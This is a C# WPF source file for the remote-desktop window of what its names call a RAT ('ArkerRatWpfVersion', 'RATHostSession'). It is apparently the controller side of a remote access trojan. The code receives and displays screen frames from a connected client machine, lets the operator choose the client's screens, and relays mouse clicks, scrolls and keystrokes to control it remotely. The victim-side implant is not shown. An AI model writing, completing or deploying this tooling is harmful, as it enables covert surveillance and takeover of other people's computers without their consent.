using ArkerRatWpfVersion;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;
using NAudio.Wave;
using System.Diagnostics;
using System.Windows.Markup;

namespace ArkerRatWpfVersion
{
    /// <summary>
    /// Interaction logic for RemoteDesktopWindow.xaml
    /// </summary>
    public partial class RemoteDesktopWindow : Window
    {
        public RATHostSession clientSession { get; set; }

        public RemoteDesktopWindow(RATHostSession session)
        {
            InitializeComponent();
            ScreenList.Items.Add("none");
            ScreenList.SelectedItem = ScreenList.Items[0];
            ScreenList.SelectionChanged += SendSelectedScreen;


            clientSession = session;
            windowText.Content +=" - "+clientSession.clientInfo[0];

GlobalVariables.byteSize = 262144;
            lock (GlobalVariables._lock)
            {
                clientSession.data = "§PingStart§§PingEnd§";
            }

            Task.Run(()=> FrameBuffer());
            //ResetWhenTheDelayOfFramesIsToLarge();

            clientSession.remoteDesktopWindowIsAlreadyOpen = true;
            this.PreviewKeyDown += new KeyEventHandler(SendKeystrokesToClient);
            this.PreviewMouseWheel += new MouseWheelEventHandler(SendScrollToClient);
            remoteDesktopVideoFrame.Stretch = Stretch.Fill;
            Task.Delay(300);
            clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
        }
        bool close = false;
        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if (!close)
                e.Cancel = true;
        }

        private async void SendScrollToClient(object sender, MouseWheelEventArgs e)
        {
            if (!mouseInput)
                return;

            e.Handled = true; // Mark the event as handled to prevent it from bubbling up to the window

            Point relativeClickPos = e.GetPosition(remoteDesktopVideoFrame);

            double clickX = relativeClickPos.X * Convert.ToDouble(clientSession.resulotion[1]) / remoteDesktopVideoFrame.ActualWidth;
            double clickY = relativeClickPos.Y * Convert.ToDouble(clientSession.resulotion[0]) / remoteDesktopVideoFrame.ActualHeight;

            await clientSession.SendData("§RemoteDesktopStart§§ClickPositionStart§" + Convert.ToString(clickX) + "," + Convert.ToString(clickY) + "," + e.Delta.ToString() + "§ClickPositionEnd§§RemoteDesktopEnd§");
        }
        private async void SendKeystrokesToClient(object sender, KeyEventArgs e)
        {
            if (!keyBoardInput)
                return;

            e.Handled = true;
            await clientSession.SendData("§RemoteDesktopStart§" + "§KI§"+e.Key.ToString().ToLower()+"§RemoteDesktopEnd§");
        }

        public async void CloseWindow(object sender, RoutedEventArgs e)
        {
            await clientSession.SendData("§RemoteDesktopStart§close§RemoteDesktopEnd§");
            clientSession.remoteDesktopWindowIsAlreadyOpen = false;
            frameQue = new ConcurrentQueue<string>();



            while (frameQue.Count > 0)
            {
                await Task.Delay(100);
            }
            await Task.Delay(500);

            lock (GlobalVariables._lock)
            {
                clientSession.data = "§PingStart§§PingEnd§";
            }

            if(!clientSession.remoteAudioWindowIsAlreadyOpen)
            GlobalVariables.byteSize = 1024;
            
            close = true;
            Close();
        }

        bool zoom = true;
        private void MaximizeWindow(object sender, RoutedEventArgs e)
        {
            if (zoom)
            {
                this.Width = this.Width * 2;
                this.Height = this.Height * 2;
                zoom = false;
            }
            else
            {
                this.Width = this.Width / 2;
                this.Height = this.Height / 2;
                zoom = true;
            }

        }

        private void MinimizeWindow(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        public void AddScreens(string screens)
        {
            screens = screens.Replace("§screen§", string.Empty);

            if(screens == "none")
            {
                frameQue = new ConcurrentQueue<string>();
                lock (GlobalVariables._lock)
                {
                    clientSession.data = "§PingStart§§PingEnd§";
                }
                Application.Current.Dispatcher.InvokeAsync(() => remoteDesktopVideoFrame.Source =null);
                return;
            }

            string[] screenArray = screens.Split('|');
            foreach (string screen in screenArray)
            {
                Application.Current.Dispatcher.InvokeAsync(() => ScreenList.Items.Add(screen));
            }
        }

        private async void SendSelectedScreen(object sender, SelectionChangedEventArgs e)
        {
           await clientSession.SendData("§RemoteDesktopStart§§screen§"+((ComboBox)sender).SelectedItem.ToString()+ "§RemoteDesktopEnd§");
        }

        private async void ImageControl_PreviewMouseDown(object sender, MouseButtonEventArgs e)
        {
            if(!mouseInput)
                return;

            e.Handled = true; // Mark the event as handled to prevent it from bubbling up to the window

            Point relativeClickPos = e.GetPosition(remoteDesktopVideoFrame);

            double clickX = relativeClickPos.X * Convert.ToDouble(clientSession.resulotion[1]) / remoteDesktopVideoFrame.ActualWidth;
            double clickY = relativeClickPos.Y * Convert.ToDouble(clientSession.resulotion[0]) / remoteDesktopVideoFrame.ActualHeight;

            await clientSession.SendData("§RemoteDesktopStart§§ClickPositionStart§" + Convert.ToString(clickX) + "," + Convert.ToString(clickY)+","+e.ChangedButton.ToString() + "§ClickPositionEnd§§RemoteDesktopEnd§");
        }

        private void Window_MouseDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            if (e.LeftButton == System.Windows.Input.MouseButtonState.Pressed)
            {
                DragMove();
            }
        }

       

        public ConcurrentQueue<string> frameQue = new ConcurrentQueue<string>();



        private async void FrameBuffer()
        {

            System.Timers.Timer timer = new System.Timers.Timer(1000);
            timer.Interval = 1000;
            timer.Elapsed += FPSCalculator;
            timer.Enabled=true;
            while (!clientSession.source.IsCancellationRequested && clientSession.remoteDesktopWindowIsAlreadyOpen)
               {
                   string temp = string.Empty;
                   frameQue.TryDequeue(out temp);

                   if (!string.IsNullOrEmpty(temp))
                   {
                        //Frame
                           ReceiveFrameChunk(temp);
                   }
            }

            timer.Dispose();
        }

        int frameCounter=0;

        private MemoryStream _frameStream = new MemoryStream();
        public async void ReceiveFrameChunk(string frameChunk)
        {
            if (frameChunk.Contains("§RemoteDesktopFrameDone§"))
            {
                byte[] frameBytes = CombineFrameChunks();
                _frameStream.SetLength(0); // Reset the stream

                await Application.Current.Dispatcher.InvokeAsync(() =>
                {
                    //try
                    //{
                        BitmapImage bitmapImage = new BitmapImage();
                        bitmapImage.BeginInit();
                        bitmapImage.CacheOption = BitmapCacheOption.OnLoad;
                        bitmapImage.StreamSource = new MemoryStream(frameBytes);
                        bitmapImage.EndInit();

                        remoteDesktopVideoFrame.Source = bitmapImage;

                        frameCounter++;
                    //}
                    //catch (Exception ex) { }
                });
            }
            else
            {
                try
                {
                    byte[] chunkBytes = Convert.FromBase64String(frameChunk);
                    await _frameStream.WriteAsync(chunkBytes, 0, chunkBytes.Length);

                }
                catch (Exception ex) { return; }
            }
        }

        private void FPSCalculator(object sender, EventArgs e)
        {
            Task.Run(() =>
            {
                Application.Current.Dispatcher.Invoke(() => FPSLabel.Content = "FPS:" + frameCounter);
                frameCounter = 0;
            });
                
        }
     
        private byte[] CombineFrameChunks()
        {
            byte[] frameBytes = _frameStream.ToArray();
            return frameBytes;
        }

        bool keyBoardInput= false;
        private void KeyboardInputButton_Click(object sender, RoutedEventArgs e)
        {
            keyBoardInput = !keyBoardInput;

            if (keyBoardInput)
            {
                KeyboardInputButton.Content = "Disable keyboard input";
            }
            else
            {
                KeyboardInputButton.Content = "Enable keyboard input";
            }
        }

        bool mouseInput = false;
        private void MouseInputButton_Click(object sender, RoutedEventArgs e)
        {
            mouseInput = !mouseInput;

            if(mouseInput)
            {
                MouseInputButton.Content = "Disable mouse input";
            }
            else
            {
                MouseInputButton.Content = "Enable mouse input";
            }
        }

        //_______

    }
}
